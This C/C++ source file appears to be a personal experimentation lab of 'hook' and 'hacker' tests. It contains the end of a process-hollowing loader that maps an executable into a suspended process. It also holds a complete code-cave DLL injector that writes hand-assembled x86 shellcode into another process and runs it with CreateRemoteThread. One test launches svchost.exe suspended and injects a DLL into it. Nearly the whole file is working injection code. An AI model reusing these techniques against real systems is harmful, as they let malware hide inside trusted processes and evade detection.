			   ResumeThread(pi.hThread);
			   printf("Process resumed (PID = %d).\n", pi.dwProcessId);
			}
			else
			{
			   printf("WriteProcessMemory failed\n");
			   TerminateProcess(pi.hProcess, 0);
			}
		  }
		  else
		  {
			printf("Load failed. Consider making this EXE relocatable.\n");
			TerminateProcess(pi.hProcess, 0);
		  }
	   }
	   else
	   {
		  printf("Cannot load %s\n", TARGETPROC);
	   }
	}

	void test11()
	{
		MZHeader mzH;
		PE_Header peH;
		PE_ExtHeader peXH;
		SectionHeader *secHdr;
		LPVOID ptrLoc;
		FILE *fp;

// 		PID = (CHAR*)malloc(1024);
// 		memset(PID, 0, 1024);
// 		strcpy(PID, argv[2]);
// 		EXPD= TRUE ;

		//fp = fopen("E:\\QC-nd\\svn\\MyLab\\trunk\\MyLab\\pro\\xTest\\test_res\\res.exe", "rb");
		//fp = fopen("D:\\Downloads\\ThunderMini_1.5.3.288.exe", "rb"); 
		fp = fopen("E:\\QC-nd\\svn\\MyLab\\trunk\\MyLab\\pro\\xTest\\test_res\\A1.exe", "rb");
		if(fp)
		{
			if(readPEInfo(fp, &mzH, &peH, &peXH, &secHdr)) // 得到PE 结构
			{
				int imageSize = calcTotalImageSize(&mzH, &peH, &peXH, secHdr); //得到文件占用的内存空间的大小
				printf("Image Size = %X\n", imageSize);

				ptrLoc = VirtualAlloc(NULL, imageSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE); //分配内存
				if(ptrLoc)
				{
					printf("Memory allocated at %X\n", ptrLoc);
					loadPE(fp, &mzH, &peH, &peXH, secHdr, ptrLoc);    //把文件加载到内存中                            

					doFork(&mzH, &peH, &peXH, secHdr, ptrLoc, imageSize);                     
				}
				else
					printf("Allocation failed\n");
			}

			fclose(fp);
		}
		else
			printf("\nCannot open the EXE file!\n");

		printf("");

		// 在XP下可以， WIN7下不行
	}

	// DLL注入

	void Inject(HANDLE hProcess, const char* dllname, const char* funcname)
	{
	//------------------------------------------//
	// Function variables.						//
	//------------------------------------------//

		// Main DLL we will need to load
		HMODULE kernel32	= NULL;

		// Main functions we will need to import
		FARPROC loadlibrary		= NULL;
		FARPROC getprocaddress	= NULL;
		FARPROC exitprocess		= NULL;
		FARPROC exitthread		= NULL;
		FARPROC freelibraryandexitthread = NULL;

		// The workspace we will build the codecave on locally
		LPBYTE workspace		= NULL;
		DWORD workspaceIndex	= 0;

		// The memory in the process we write to
		LPVOID codecaveAddress	= NULL;
		DWORD dwCodecaveAddress = 0;

		// Strings we have to write into the process
		char injectDllName[MAX_PATH + 1]	= {0};
		char injectFuncName[MAX_PATH + 1]	= {0};
		char injectError0[MAX_PATH + 1]		= {0};
		char injectError1[MAX_PATH + 1]		= {0};
		char injectError2[MAX_PATH + 1]		= {0};
		char user32Name[MAX_PATH + 1]		= {0};
		char msgboxName[MAX_PATH + 1]		= {0};

		// Placeholder addresses to use the strings
		DWORD user32NameAddr	= 0;
		DWORD user32Addr		= 0;
		DWORD msgboxNameAddr	= 0;
		DWORD msgboxAddr		= 0;
		DWORD dllAddr			= 0;
		DWORD dllNameAddr		= 0;
		DWORD funcNameAddr		= 0;
		DWORD error0Addr		= 0;
		DWORD error1Addr		= 0;
		DWORD error2Addr		= 0;

		// Where the codecave execution should begin at
		DWORD codecaveExecAddr = 0;

		// Handle to the thread we create in the process
		HANDLE hThread = NULL;

		// Temp variables
		DWORD dwTmpSize = 0;

		// Old protection on page we are writing to in the process and the bytes written
		DWORD oldProtect	= 0;	
		DWORD bytesRet		= 0;

	//------------------------------------------//
	// Variable initialization.					//
	//------------------------------------------//

		// Get the address of the main DLL
		kernel32	= LoadLibrary("kernel32.dll");

		// Get our functions
		loadlibrary		= GetProcAddress(kernel32,	"LoadLibraryA");
		getprocaddress	= GetProcAddress(kernel32,	"GetProcAddress");
		exitprocess		= GetProcAddress(kernel32,	"ExitProcess");
		exitthread		= GetProcAddress(kernel32,	"ExitThread");
		freelibraryandexitthread = GetProcAddress(kernel32,	"FreeLibraryAndExitThread");

	// This section will cause compiler warnings on VS8, 
	// you can upgrade the functions or ignore them

		// Build names
		_snprintf(injectDllName, MAX_PATH, "%s", dllname);
		_snprintf(injectFuncName, MAX_PATH, "%s", funcname);
		_snprintf(user32Name, MAX_PATH, "user32.dll");
		_snprintf(msgboxName, MAX_PATH, "MessageBoxA");

		// Build error messages
		_snprintf(injectError0, MAX_PATH, "Error");
		_snprintf(injectError1, MAX_PATH, "Could not load the dll: %s", injectDllName);
		_snprintf(injectError2, MAX_PATH, "Could not load the function: %s", injectFuncName);

		// Create the workspace
		workspace = (LPBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024);

		// Allocate space for the codecave in the process
		codecaveAddress = VirtualAllocEx(hProcess, 0, 1024, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		dwCodecaveAddress = PtrToUlong(codecaveAddress);

	// Note there is no error checking done above for any functions that return a pointer/handle.
	// I could have added them, but it'd just add more messiness to the code and not provide any real
	// benefit. It's up to you though in your final code if you want it there or not.

	//------------------------------------------//
	// Data and string writing.					//
	//------------------------------------------//

		// Write out the address for the user32 dll address
		user32Addr = workspaceIndex + dwCodecaveAddress;
		dwTmpSize = 0;
		memcpy(workspace + workspaceIndex, &dwTmpSize, 4);
		workspaceIndex += 4;

		// Write out the address for the MessageBoxA address
		msgboxAddr = workspaceIndex + dwCodecaveAddress;
		dwTmpSize = 0;
		memcpy(workspace + workspaceIndex, &dwTmpSize, 4);
		workspaceIndex += 4;

		// Write out the address for the injected DLL's module
		dllAddr = workspaceIndex + dwCodecaveAddress;
		dwTmpSize = 0;
		memcpy(workspace + workspaceIndex, &dwTmpSize, 4);
		workspaceIndex += 4;

		// User32 Dll Name
		user32NameAddr = workspaceIndex + dwCodecaveAddress;
		dwTmpSize = (DWORD)strlen(user32Name) + 1;
		memcpy(workspace + workspaceIndex, user32Name, dwTmpSize);
		workspaceIndex += dwTmpSize;

		// MessageBoxA name
		msgboxNameAddr = workspaceIndex + dwCodecaveAddress;
		dwTmpSize = (DWORD)strlen(msgboxName) + 1;
		memcpy(workspace + workspaceIndex, msgboxName, dwTmpSize);
		workspaceIndex += dwTmpSize;

		// Dll Name
		dllNameAddr = workspaceIndex + dwCodecaveAddress;
		dwTmpSize = (DWORD)strlen(injectDllName) + 1;
		memcpy(workspace + workspaceIndex, injectDllName, dwTmpSize);
		workspaceIndex += dwTmpSize;

		// Function Name
		funcNameAddr = workspaceIndex + dwCodecaveAddress;
		dwTmpSize = (DWORD)strlen(injectFuncName) + 1;
		memcpy(workspace + workspaceIndex, injectFuncName, dwTmpSize);
		workspaceIndex += dwTmpSize;

		// Error Message 1
		error0Addr = workspaceIndex + dwCodecaveAddress;
		dwTmpSize = (DWORD)strlen(injectError0) + 1;
		memcpy(workspace + workspaceIndex, injectError0, dwTmpSize);
		workspaceIndex += dwTmpSize;

		// Error Message 2
		error1Addr = workspaceIndex + dwCodecaveAddress;
		dwTmpSize = (DWORD)strlen(injectError1) + 1;
		memcpy(workspace + workspaceIndex, injectError1, dwTmpSize);
		workspaceIndex += dwTmpSize;

		// Error Message 3
		error2Addr = workspaceIndex + dwCodecaveAddress;
		dwTmpSize = (DWORD)strlen(injectError2) + 1;
		memcpy(workspace + workspaceIndex, injectError2, dwTmpSize);
		workspaceIndex += dwTmpSize;

		// Pad a few INT3s after string data is written for seperation
		workspace[workspaceIndex++] = 0xCC;
		workspace[workspaceIndex++] = 0xCC;
		workspace[workspaceIndex++] = 0xCC;

		// Store where the codecave execution should begin
		codecaveExecAddr = workspaceIndex + dwCodecaveAddress;

	// For debugging - infinite loop, attach onto process and step over
		//workspace[workspaceIndex++] = 0xEB;
		//workspace[workspaceIndex++] = 0xFE;

	//------------------------------------------//
	// User32.dll loading.						//
	//------------------------------------------//

	// User32 DLL Loading
		// PUSH 0x00000000 - Push the address of the DLL name to use in LoadLibraryA
		workspace[workspaceIndex++] = 0x68;
		memcpy(workspace + workspaceIndex, &user32NameAddr, 4);
		workspaceIndex += 4;

		// MOV EAX, ADDRESS - Move the address of LoadLibraryA into EAX
		workspace[workspaceIndex++] = 0xB8;
		memcpy(workspace + workspaceIndex, &loadlibrary, 4);
		workspaceIndex += 4;

		// CALL EAX - Call LoadLibraryA
		workspace[workspaceIndex++] = 0xFF;
		workspace[workspaceIndex++] = 0xD0;

	// MessageBoxA Loading
		// PUSH 0x000000 - Push the address of the function name to load
		workspace[workspaceIndex++] = 0x68;
		memcpy(workspace + workspaceIndex, &msgboxNameAddr, 4);
		workspaceIndex += 4;

		// Push EAX, module to use in GetProcAddress
		workspace[workspaceIndex++] = 0x50;

		// MOV EAX, ADDRESS - Move the address of GetProcAddress into EAX
		workspace[workspaceIndex++] = 0xB8;
		memcpy(workspace + workspaceIndex, &getprocaddress, 4);
		workspaceIndex += 4;

		// CALL EAX - Call GetProcAddress
		workspace[workspaceIndex++] = 0xFF;
		workspace[workspaceIndex++] = 0xD0;

		// MOV [ADDRESS], EAX - Save the address to our variable
		workspace[workspaceIndex++] = 0xA3;
		memcpy(workspace + workspaceIndex, &msgboxAddr, 4);
		workspaceIndex += 4;

	//------------------------------------------//
	// Injected dll loading.					//
	//------------------------------------------//

	/*
		// This is the way the following assembly code would look like in C/C++

		// Load the injected DLL into this process
		HMODULE h = LoadLibrary("mydll.dll");
		if(!h)
		{
			MessageBox(0, "Could not load the dll: mydll.dll", "Error", MB_ICONERROR);
			ExitProcess(0);
		}

		// Get the address of the export function
		FARPROC p = GetProcAddress(h, "Initialize");
		if(!p)
		{
			MessageBox(0, "Could not load the function: Initialize", "Error", MB_ICONERROR);
			ExitProcess(0);
		}

		// So we do not need a function pointer interface
		__asm call p

		// Exit the thread so the loader continues
		ExitThread(0);
	*/

	// DLL Loading
		// PUSH 0x00000000 - Push the address of the DLL name to use in LoadLibraryA
		workspace[workspaceIndex++] = 0x68;
		memcpy(workspace + workspaceIndex, &dllNameAddr, 4);
		workspaceIndex += 4;

		// MOV EAX, ADDRESS - Move the address of LoadLibraryA into EAX
		workspace[workspaceIndex++] = 0xB8;
		memcpy(workspace + workspaceIndex, &loadlibrary, 4);
		workspaceIndex += 4;

		// CALL EAX - Call LoadLibraryA
		workspace[workspaceIndex++] = 0xFF;
		workspace[workspaceIndex++] = 0xD0;

	// Error Checking
		// CMP EAX, 0
		workspace[workspaceIndex++] = 0x83;
		workspace[workspaceIndex++] = 0xF8;
		workspace[workspaceIndex++] = 0x00;

	// JNZ EIP + 0x1E to skip over eror code
		workspace[workspaceIndex++] = 0x75;
		workspace[workspaceIndex++] = 0x1E;

	// Error Code 1
		// MessageBox
			// PUSH 0x10 (MB_ICONHAND)
			workspace[workspaceIndex++] = 0x6A;
			workspace[workspaceIndex++] = 0x10;

			// PUSH 0x000000 - Push the address of the MessageBox title
			workspace[workspaceIndex++] = 0x68;
			memcpy(workspace + workspaceIndex, &error0Addr, 4);
			workspaceIndex += 4;

			// PUSH 0x000000 - Push the address of the MessageBox message
			workspace[workspaceIndex++] = 0x68;
			memcpy(workspace + workspaceIndex, &error1Addr, 4);
			workspaceIndex += 4;

			// Push 0
			workspace[workspaceIndex++] = 0x6A;
			workspace[workspaceIndex++] = 0x00;

			// MOV EAX, [ADDRESS] - Move the address of MessageBoxA into EAX
			workspace[workspaceIndex++] = 0xA1;
			memcpy(workspace + workspaceIndex, &msgboxAddr, 4);
			workspaceIndex += 4;

			// CALL EAX - Call MessageBoxA
			workspace[workspaceIndex++] = 0xFF;
			workspace[workspaceIndex++] = 0xD0;

		// ExitProcess
			// Push 0
			workspace[workspaceIndex++] = 0x6A;
			workspace[workspaceIndex++] = 0x00;

			// MOV EAX, ADDRESS - Move the address of ExitProcess into EAX
			workspace[workspaceIndex++] = 0xB8;
			memcpy(workspace + workspaceIndex, &exitprocess, 4);
			workspaceIndex += 4;

			// CALL EAX - Call MessageBoxA
			workspace[workspaceIndex++] = 0xFF;
			workspace[workspaceIndex++] = 0xD0;

	//	Now we have the address of the injected DLL, so save the handle

		// MOV [ADDRESS], EAX - Save the address to our variable
		workspace[workspaceIndex++] = 0xA3;
		memcpy(workspace + workspaceIndex, &dllAddr, 4);
		workspaceIndex += 4;

	// Load the initilize function from it

		// PUSH 0x000000 - Push the address of the function name to load
		workspace[workspaceIndex++] = 0x68;
		memcpy(workspace + workspaceIndex, &funcNameAddr, 4);
		workspaceIndex += 4;

		// Push EAX, module to use in GetProcAddress
		workspace[workspaceIndex++] = 0x50;

		// MOV EAX, ADDRESS - Move the address of GetProcAddress into EAX
		workspace[workspaceIndex++] = 0xB8;
		memcpy(workspace + workspaceIndex, &getprocaddress, 4);
		workspaceIndex += 4;

		// CALL EAX - Call GetProcAddress
		workspace[workspaceIndex++] = 0xFF;
		workspace[workspaceIndex++] = 0xD0;

	// Error Checking
		// CMP EAX, 0
		workspace[workspaceIndex++] = 0x83;
		workspace[workspaceIndex++] = 0xF8;
		workspace[workspaceIndex++] = 0x00;

	// JNZ EIP + 0x1C to skip eror code
		workspace[workspaceIndex++] = 0x75;
		workspace[workspaceIndex++] = 0x1C;

	// Error Code 2
		// MessageBox
			// PUSH 0x10 (MB_ICONHAND)
			workspace[workspaceIndex++] = 0x6A;
			workspace[workspaceIndex++] = 0x10;

			// PUSH 0x000000 - Push the address of the MessageBox title
			workspace[workspaceIndex++] = 0x68;
			memcpy(workspace + workspaceIndex, &error0Addr, 4);
			workspaceIndex += 4;

			// PUSH 0x000000 - Push the address of the MessageBox message
			workspace[workspaceIndex++] = 0x68;
			memcpy(workspace + workspaceIndex, &error2Addr, 4);
			workspaceIndex += 4;

			// Push 0
			workspace[workspaceIndex++] = 0x6A;
			workspace[workspaceIndex++] = 0x00;

			// MOV EAX, ADDRESS - Move the address of MessageBoxA into EAX
			workspace[workspaceIndex++] = 0xA1;
			memcpy(workspace + workspaceIndex, &msgboxAddr, 4);
			workspaceIndex += 4;

			// CALL EAX - Call MessageBoxA
			workspace[workspaceIndex++] = 0xFF;
			workspace[workspaceIndex++] = 0xD0;

		// ExitProcess
			// Push 0
			workspace[workspaceIndex++] = 0x6A;
			workspace[workspaceIndex++] = 0x00;

			// MOV EAX, ADDRESS - Move the address of ExitProcess into EAX
			workspace[workspaceIndex++] = 0xB8;
			memcpy(workspace + workspaceIndex, &exitprocess, 4);
			workspaceIndex += 4;

	//	Now that we have the address of the function, we cam call it, 
	// if there was an error, the messagebox would be called as well.

		// CALL EAX - Call ExitProcess -or- the Initialize function
		workspace[workspaceIndex++] = 0xFF;
		workspace[workspaceIndex++] = 0xD0;

		// If we get here, the Initialize function has been called, 
		// so it's time to close this thread and optionally unload the DLL.

	//------------------------------------------//
	// Exiting from the injected dll.			//
	//------------------------------------------//

	// Call ExitThread to leave the DLL loaded
	#if 1
		// Push 0 (exit code)
		workspace[workspaceIndex++] = 0x6A;
		workspace[workspaceIndex++] = 0x00;

		// MOV EAX, ADDRESS - Move the address of ExitThread into EAX
		workspace[workspaceIndex++] = 0xB8;
		memcpy(workspace + workspaceIndex, &exitthread, 4);
		workspaceIndex += 4;

		// CALL EAX - Call ExitThread
		workspace[workspaceIndex++] = 0xFF;
		workspace[workspaceIndex++] = 0xD0;
	#endif

	// Call FreeLibraryAndExitThread to unload DLL
	#if 0
		// Push 0 (exit code)
		workspace[workspaceIndex++] = 0x6A;
		workspace[workspaceIndex++] = 0x00;

		// PUSH [0x000000] - Push the address of the DLL module to unload
		workspace[workspaceIndex++] = 0xFF;
		workspace[workspaceIndex++] = 0x35;
		memcpy(workspace + workspaceIndex, &dllAddr, 4);
		workspaceIndex += 4;

		// MOV EAX, ADDRESS - Move the address of FreeLibraryAndExitThread into EAX
		workspace[workspaceIndex++] = 0xB8;
		memcpy(workspace + workspaceIndex, &freelibraryandexitthread, 4);
		workspaceIndex += 4;

		// CALL EAX - Call FreeLibraryAndExitThread
		workspace[workspaceIndex++] = 0xFF;
		workspace[workspaceIndex++] = 0xD0;
	#endif

	//------------------------------------------//
	// Code injection and cleanup.				//
	//------------------------------------------//

		// Change page protection so we can write executable code
		VirtualProtectEx(hProcess, codecaveAddress, workspaceIndex, PAGE_EXECUTE_READWRITE, &oldProtect);

		// Write out the patch
		WriteProcessMemory(hProcess, codecaveAddress, workspace, workspaceIndex, &bytesRet);

		// Restore page protection
		VirtualProtectEx(hProcess, codecaveAddress, workspaceIndex, oldProtect, &oldProtect);

		// Make sure our changes are written right away
		FlushInstructionCache(hProcess, codecaveAddress, workspaceIndex);

		// Free the workspace memory
		HeapFree(GetProcessHeap(), 0, workspace);

		// Execute the thread now and wait for it to exit, note we execute where the code starts, and not the codecave start
		// (since we wrote strings at the start of the codecave) -- NOTE: void* used for VC6 compatibility instead of UlongToPtr
		hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((void*)codecaveExecAddr), 0, 0, NULL);
		WaitForSingleObject(hThread, INFINITE); 

		// Free the memory in the process that we allocated
		VirtualFreeEx(hProcess, codecaveAddress, 0, MEM_RELEASE);
	}

	int test12_proc()
	{
		// Structures for creating the process
		STARTUPINFO si = {0};
		PROCESS_INFORMATION pi = {0};
		BOOL result = FALSE;

// 		char* exeString = "\"C:\\Program Files\\Windows NT\\Pinball\\PINBALL.EXE\" -quick";
// 		char* workingDir = "C:\\Program Files\\Windows NT\\Pinball";

		char dllPath[MAX_PATH + 1] = {0};

		// Need to set this for the structure
		si.cb = sizeof(STARTUPINFO);

		//char* exeString = "E:\\QC-nd\\svn\\MyLab\\trunk\\MyLab\\pro\\xTest\\test_res\\A1.exe";
		char* exeString = "svchost.exe";
		_snprintf(dllPath, MAX_PATH, "E:\\QC-nd\\svn\\MyLab\\trunk\\MyLab\\pro\\xTest\\test_res\\B1.dll");

		// Try to load our process
		//result = CreateProcess(NULL, exeString, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, workingDir, &si, &pi);
		result = CreateProcess(NULL, exeString, NULL, NULL, FALSE, CREATE_SUSPENDED|CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
		if(!result)
		{
			MessageBox(0, "Process could not be loaded!", "Error", MB_ICONERROR);
			return -1;
		}

		// Inject the DLL, the export function is named 'Initialize'
		Inject(pi.hProcess, dllPath, "Initialize");

		// Resume process execution
		ResumeThread(pi.hThread);

		// Standard return

		return 0; 
	}

// 	BOOL APIENTRY DllMain( HMODULE hModule,   //dll内部结构要求
// 		DWORD  ul_reason_for_call,
// 		LPVOID lpReserved
// 		)
// 	{
// 		switch (ul_reason_for_call)
// 		{
// 		case DLL_PROCESS_ATTACH:
// 			printf("\n hello dll");
// 		case DLL_THREAD_ATTACH:
// 		case DLL_THREAD_DETACH:
// 		case DLL_PROCESS_DETACH:
// 			break;
// 		}
// 		return TRUE;
// 	}
// 
// 
// 	extern "C" __declspec(dllexport) void Initialize()
// 	{
// 		printf("\n DLL Injection Successful!");
// 		MessageBox(0, "Locked and Loaded.", "DLL Injection Successful!", 0);
// 	}

	void test12()
	{
		test12_proc();
	}

}

void test_hacker()
{
	//space_test_hook::test1();
	//space_test_hook::test2();
	//space_test_hook::test3();
	//space_test_hook::test4();
	//space_test_hook::test5();
	//space_test_hook::test6();
	//space_test_hook::test7();
	//space_test_hook::test8();
	//space_test_hook::test9();
	//space_test_hook::test10();
	//space_test_hook::test11();
	space_test_hook::test12();

	getchar();
}